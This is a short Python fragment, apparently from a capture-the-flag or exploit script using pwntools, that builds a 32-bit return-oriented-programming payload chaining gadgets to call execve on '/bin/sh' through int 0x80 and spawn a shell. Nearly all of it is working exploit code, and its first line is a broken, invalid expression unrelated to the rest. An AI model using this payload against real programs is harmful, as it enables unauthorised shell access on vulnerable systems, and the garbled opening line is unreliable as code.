float(2**(32+))/float(0x)

def getPayload():
    xoreax = gadget("xor eax, eax; ret")
    log.info(repr(xoreax))
    inceax = gadget("inc eax; ret")
    log.info(repr(inceax))
    popebx = gadget("pop ebx; ret")
    log.info(repr(popebx))
    popecxedx = gadget("pop ecx; pop edx; ret")
    log.info(repr(popecxedx))
    intx = gadget("int 0x80")


    payload = xoreax # Set eax to 0xb
    payload += inceax * constants.SYS_execve

    # Set ebx to /bin/sh
    payload += popebx + p32(libc.search("/bin/sh").next())

    # 0 out ecx, edx
    payload += popecxedx + p32(0) * 2

    # Call int 0x80
    payload += intx
    return payload